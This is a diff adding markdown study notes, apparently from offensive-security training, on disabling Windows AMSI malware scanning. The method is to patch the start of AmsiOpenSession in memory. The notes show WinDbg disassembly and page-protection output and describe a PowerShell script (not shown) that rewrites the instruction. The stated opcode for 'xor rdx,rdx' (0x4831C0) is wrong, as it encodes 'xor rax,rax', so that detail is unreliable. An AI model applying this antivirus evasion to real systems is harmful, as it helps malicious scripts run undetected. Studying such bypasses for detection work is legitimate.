@@ -170,4 +170,68 @@ The amsiInitFailed field is verified by AmsiOpenSession in the same manner as th
 We could reuse the dynamic discovery of types and fields from our amsiContext AMSI bypass to evade the signatures and reuse this bypass.
 
 **TODO.Create the bypass TTP script using dynamic discovery type.**
-P237
+
+#### Attack AmsiOpenSession binary patching
+We want to modify the assembly instructions themselve for this attack instead of the field data. We will target **AmsiOpenSession** funtion.
+
+- First we need to understand the AmsiOpenSession assembly flow by dumping content of AmsiOpenSession
+
+```
+0:013> u amsi!AmsiOpenSession L1A
+amsi!AmsiOpenSession:
+00007ffa`4dbf3560 4885d2          test    rdx,rdx
+00007ffa`4dbf3563 7447            je      amsi!AmsiOpenSession+0x4c (00007ffa`4dbf35ac)
+00007ffa`4dbf3565 4885c9          test    rcx,rcx
+00007ffa`4dbf3568 7442            je      amsi!AmsiOpenSession+0x4c (00007ffa`4dbf35ac)
+00007ffa`4dbf356a 8139414d5349    cmp     dword ptr [rcx],49534D41h
+00007ffa`4dbf3570 753a            jne     amsi!AmsiOpenSession+0x4c (00007ffa`4dbf35ac)
+00007ffa`4dbf3572 4883790800      cmp     qword ptr [rcx+8],0
+00007ffa`4dbf3577 7433            je      amsi!AmsiOpenSession+0x4c (00007ffa`4dbf35ac)
+00007ffa`4dbf3579 4883791000      cmp     qword ptr [rcx+10h],0
+00007ffa`4dbf357e 742c            je      amsi!AmsiOpenSession+0x4c (00007ffa`4dbf35ac)
+00007ffa`4dbf3580 41b801000000    mov     r8d,1
+00007ffa`4dbf3586 418bc0          mov     eax,r8d
+00007ffa`4dbf3589 f00fc14118      lock xadd dword ptr [rcx+18h],eax
+00007ffa`4dbf358e 4103c0          add     eax,r8d
+00007ffa`4dbf3591 4898            cdqe
+00007ffa`4dbf3593 488902          mov     qword ptr [rdx],rax
+00007ffa`4dbf3596 7510            jne     amsi!AmsiOpenSession+0x48 (00007ffa`4dbf35a8)
+00007ffa`4dbf3598 418bc0          mov     eax,r8d
+00007ffa`4dbf359b f00fc14118      lock xadd dword ptr [rcx+18h],eax
+00007ffa`4dbf35a0 4103c0          add     eax,r8d
+00007ffa`4dbf35a3 4898            cdqe
+00007ffa`4dbf35a5 488902          mov     qword ptr [rdx],rax
+00007ffa`4dbf35a8 33c0            xor     eax,eax
+00007ffa`4dbf35aa c3              ret
+00007ffa`4dbf35ab cc              int     3
+```
+Pay attention to assembly line 1 and line 2. The conditional jump is controlled by the TEST instruction according to the argument and is
+executed if the zero flag is equal to 1. We want to force the Zero flag by XOR two same register. In this case, we overwrite ```test    rdx,rdx``` to ```xor    rdx,rdx``` using this [assembler converter](https://defuse.ca/online-x86-assembler.htm#disassembly) we can get the hex instruction for  ```xor    rdx,rdx``` 0X4831C0.
+
+- Second, We need to consider memory protection setting. Normally, code pages are set to PAGE_EXECUTE_READ, or 0x20, which means we can read and
+execute this code, but not write to it. We can verify the in WinDg with ```!vport ```
+
+```
+0:013> !vprot 00007ffa4dbf3560
+BaseAddress:       00007ffa4dbf3000
+AllocationBase:    00007ffa4dbf0000
+AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
+RegionSize:        0000000000009000
+State:             00001000  MEM_COMMIT
+Protect:           00000020  PAGE_EXECUTE_READ
+Type:              01000000  MEM_IMAGE
+
+```
+The protection type is ```PAGE_EXECUTE_READ```. We can't write to it.
+
+- In[PatchingAsmiopenSessionppcodes.ps1](/05FightAdvancedAntivirus/PatchingAsmiopenSessionppcodes.ps1) We obatin a base address of AmsiOpenSession, change current memeory protection and overwrite it to xor rdx rdx, and change the memory protection back to 0x20.
+
+
+reslove base address from dec to hex.
+```
+0:012> ? 0n140713022928224
+Evaluate expression: 140713022928224 = 00007ffa`4dbf3560
+0:012> u 00007ffa`4dbf3560
+amsi!AmsiOpenSession:
+00007ffa`4dbf3560 4885d2          test    rdx,rdx
+```
